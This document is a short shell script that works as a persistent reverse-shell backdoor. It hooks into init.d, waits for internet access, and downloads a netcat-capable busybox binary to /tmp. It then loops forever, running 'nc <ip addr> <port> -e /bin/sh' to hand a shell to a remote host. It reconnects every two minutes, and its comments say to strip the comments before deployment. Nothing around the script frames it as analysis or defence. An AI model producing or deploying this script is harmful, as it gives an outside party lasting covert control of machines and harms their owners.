#!/bin/sh

# link to script in init.d
<path to script> &
# don't forget to make script executable
# and remove comments before deployment

# check for internet access every 1s
while ! ping -c 1 google.com;
do
  sleep 1
done

# download 
cd /tmp
wget <binary w/ nc url> # may have to self host if wget does not support https
chmod +x <binary w/ nc>
# automatically detect architecture w/ uname -p and download correct busybox binary
# wget https://busybox.net/downloads/binaries/1.21.1/busybox-"$(uname -p)" && chmod +x busybox-"$(uname -p)

while true;
do
  ./<binary w/ nc> nc <ip addr> <port> -e /bin/sh
  sleep 120 # connection fails/closes, reconnect after 2 min
done
